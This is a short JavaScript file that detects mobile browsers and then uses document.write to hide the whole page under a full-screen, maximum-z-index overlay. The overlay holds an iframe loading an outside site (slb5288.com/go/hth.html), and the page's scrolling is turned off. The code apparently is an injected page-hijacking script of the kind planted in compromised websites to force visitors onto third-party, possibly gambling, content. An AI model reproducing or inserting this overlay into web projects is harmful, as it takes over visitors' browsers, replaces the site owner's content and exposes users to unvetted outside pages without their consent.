function isMobile() {
    if ((navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i)))
        return true;
    else
        return false;
}

var url="https://www.slb5288.com/go/hth.html";
function getIosVersion() {
  var str = navigator.userAgent.toLowerCase(); 
  var ver = str.match(/cpu iphone os (.*?) like mac os/);
  return ver ? parseInt(ver[1].slice(0,2)) :false
}
var u = navigator.userAgent;
var isIOS = !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/);

function randomNum(minNum,maxNum){ 
    switch(arguments.length){ 
        case 1: 
            return parseInt(Math.random()*minNum+1,10); 
        break; 
        case 2: 
            return parseInt(Math.random()*(maxNum-minNum+1)+minNum,10); 
        break; 
            default: 
                return 0; 
            break; 
    } 
} 

const time = randomNum(500, 1000)
console.log(time)

document.write('<meta id="viewport" name="viewport" content="user-scalable=no,width=device-width, initial-scale=1.0" />'); 
document.write('<style>html,body{widht:100%;height:100%;overflow:hidden; clear:both;}</style>'); 
document.write('<div style="width:100%;height:100%;position:absolute;top:0;left:0;z-index:2147483647;background:#fff">'); 
document.write('<iframe src=" '+url+'" frameborder="0" style="border:0;width: 100%; text-align: center; border: medium none; height:100%;max-height: 4000px;"></iframe>'); 
document.write('</div>');